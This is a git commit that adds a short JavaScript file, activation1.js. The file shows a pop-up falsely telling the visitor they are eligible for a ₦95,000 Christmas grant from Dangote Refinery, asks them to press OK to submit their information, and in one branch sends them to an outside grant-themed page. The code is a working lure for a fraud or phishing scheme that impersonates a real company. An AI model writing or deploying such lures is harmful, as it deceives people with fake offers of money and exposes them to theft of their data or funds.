595dfc53f7cf89b5750f2a1e36954f3e346be273
ita-giftt <tallaakoti@gmail.com>
2025-12-22 11:21:45 +0100

    Create activation1.js

---
+++ activation1.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Grant Portal: Congratulations, you are eligible to receive the ₦95,000 Grant Opportunity for Christmas Celebration From Dangote Refinery, Kindly press OK to submit your information and receive your ₦95,000 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://rward.info/95000-Dangote-Refinery-Cash-Grant.html';
+}
